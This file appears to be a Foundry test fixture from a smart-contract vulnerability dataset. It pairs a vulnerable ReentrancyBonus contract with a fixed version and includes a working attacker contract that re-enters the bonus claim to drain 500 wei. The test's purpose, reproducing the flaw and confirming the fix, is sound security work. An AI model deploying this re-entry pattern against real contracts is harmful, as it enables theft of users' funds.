// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {ReentrancyBonus} from "../src/ReentrancyBonus.sol";
import {ReentrancyBonusFixed} from "../src/ReentrancyBonusFixed.sol";

/*
 * ReentrancyBonus differential fixture test.
 *
 * The dataset port has no payable/deposit entry point, so the TEST funds it with
 * vm.deal. getFirstWithdrawalBonus() pays a hard-coded reward of 100 wei per
 * claim; the attacker contract re-enters getFirstWithdrawalBonus() from its
 * receive() up to MAX_REENTRY times (via a low-level call whose failure is
 * ignored, so the fixed variant's reverting re-entry is harmless).
 */

/// Attacker contract for the bonus reentrancy.
contract ReentrancyBonusAttacker {
    address public bonus;
    uint256 private depth;
    uint256 internal constant MAX_REENTRY = 4;

    constructor(address _bonus) {
        bonus = _bonus;
    }

    function attack() external {
        (bool ok, ) = bonus.call(abi.encodeWithSignature("getFirstWithdrawalBonus(address)", address(this)));
        require(ok, "getFirstWithdrawalBonus failed");
    }

    receive() external payable {
        if (depth < MAX_REENTRY) {
            depth++;
            // Re-claim the "first" bonus while claimedBonus is still false.
            // In the fixed variant this reverts (already claimed) and is ignored.
            (bool ok, ) = bonus.call(abi.encodeWithSignature("getFirstWithdrawalBonus(address)", address(this)));
            ok;
        }
    }
}

contract ReentrancyBonusFixtureTest is Test {
    // Each claim pays 100 wei. Fund enough for the full re-entrant drain.
    uint256 internal constant FUNDING = 1000;
    uint256 internal constant BONUS = 100;

    function test_fixtureReproduces() public {
        ReentrancyBonus bonus = new ReentrancyBonus();
        ReentrancyBonusAttacker attacker = new ReentrancyBonusAttacker(address(bonus));
        vm.deal(address(bonus), FUNDING);

        attacker.attack();

        // A single legitimate bonus is 100 wei; the re-entrant loop claimed it
        // 5 times (initial + 4 re-entries) = 500 wei, bleeding the contract.
        assertEq(address(attacker).balance, 5 * BONUS, "REPRODUCED: 5x the bonus drained");
        assertEq(address(bonus).balance, FUNDING - 5 * BONUS, "REPRODUCED: contract bled 500 wei");
        assertGt(address(attacker).balance, BONUS, "REPRODUCED: more than one bonus");
    }

    function test_fixtureDoesNotReproduce() public {
        ReentrancyBonusFixed bonus = new ReentrancyBonusFixed();
        ReentrancyBonusAttacker attacker = new ReentrancyBonusAttacker(address(bonus));
        vm.deal(address(bonus), FUNDING);

        attacker.attack();

        // Re-entrant claims reverted (claimedBonus set before the call) and were
        // ignored: exactly one bonus of 100 wei is paid.
        assertEq(address(attacker).balance, BONUS, "only one bonus paid");
        assertEq(address(bonus).balance, FUNDING - BONUS, "contract retains the rest");
    }

    // Control: an EOA (no code, so it cannot re-enter) claims exactly one bonus,
    // and a second claim is rejected by the claimedBonus guard.
    function test_eoaClaimsOnce() public {
        ReentrancyBonus bonus = new ReentrancyBonus();
        address eoa = address(0xCAFE);
        vm.deal(address(bonus), FUNDING);

        vm.prank(eoa);
        bonus.getFirstWithdrawalBonus(eoa);
        assertEq(eoa.balance, BONUS, "EOA received exactly one bonus");

        vm.prank(eoa);
        vm.expectRevert();
        bonus.getFirstWithdrawalBonus(eoa);
    }
}
